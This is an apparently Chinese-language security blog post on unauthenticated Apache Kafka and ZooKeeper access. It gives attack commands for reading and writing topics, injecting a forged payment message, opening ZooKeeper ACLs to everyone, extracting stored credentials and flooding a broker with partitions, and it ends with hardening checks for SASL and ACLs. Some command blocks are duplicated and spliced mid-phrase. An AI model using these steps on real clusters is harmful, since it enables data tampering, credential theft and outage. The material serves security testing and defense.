#  kafka未授权漏洞   
原创 信安路漫漫  信安路漫漫   2025-05-19 23:05  
  
kafka简介Kafka 是 Apache 软件基金会的一种分布式的、基于发布/订阅的消息系统。kafka配置不当会导致未授权漏洞，接下来就来看看kafka未授权可能导致的问题。kafa的默认端口：9092版本兼容性参考表‌Kafka 版本‌‌最低 Java 版本‌2.8.xJava 83.0.xJava 113.5.xJava 17  
攻击工具与验证工具‌Kafka命令行工具‌：# 未授权生产消息kafka-console-producer.sh --broker-list <Broker_IP>:9092 --topic test_topic# 未授权消费消息kafka-console-consumer.sh --bootstrap-server <Broker_IP>:9092 --topic test_topic --from-beginning‌ZooKeeper客户端（Zookeeper未授权）# 连接未授权ZooKe# 连接未授权ZooKeeper并遍历Kafka节点zkCli.sh -server <ZooKeeper_IP>:2181ls /brokers/topics  # 查看所有Topicget /config/topics/<Topic_Name>  # 获取Topic配置eper并遍历Kafka节点 zkCli.sh -server <ZooKeeper_IP>:2181 ls /brokers/topics  # 查看所有Topic get /config/topics/<Topic_Name>  # 获取Topic配置攻击路径路径一：直接Broker利用‌数据污染‌：向业务核心Topic（如order_payment）注入伪造消息，干扰业务流程。pythonproducer.send('order_payment', b'{"user":"admin","amount":-1000}')‌敏感数据窃取‌：订阅包含用户日志或配置的Topic（如user_activity），导出数据。‌路径二：通过ZooKeeper横向控制‌ACL篡改‌：修改ZooKeeper中的ACL配置，授予攻击者管理员权限： # 在ZooKeeperbash# 在ZooKeeper客户端中执行setAcl /config/topics/sensitive_topic world:anyone:cdrwa客户端中执行 setAcl /config/topics/sensitive_topic world:anyone:cdrwa凭证提取‌：读取ZooKeeper存储的明文凭证文件（如jaas.conf），用于后续内网渗透。‌路径三：拒绝服务攻击‌资源耗尽‌：高频创建大体积Topic或发送巨型消息，触发Broker资源过载：kafka-topics.sh --create --bootstrap-server <目标IP>:9092 --topic flood_topic --partitions 1000防御建议Kafka Broker认证配置验证检查server.properties文件是否启用SASL/SSL认证：# 需存在以下至少一种认证配置（SCRAM为例） # 需存在以下至少一种认证配置（SCRAM为例）sasl.enabled.mechanisms=SCRAM-SHA-256security.inter.broker.protocol=SASL_PLAINTEXT检查ACL策略是否启用：# 查看Topic的ACL权限列表bin/kafka-acls.sh --list --bootstrap-server <Broker_IP>:9092 --topic test_topic若输出无权限限制或包含ANYONE，则存在漏洞ZooKeeper访问控制检测检查zoo.cfg配置是否启用SASL认证：# 需包含如下配置authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProviderrequireClientAuthScheme=sasl若缺失，攻击者可能通过2181端口直接访问元数据  
  
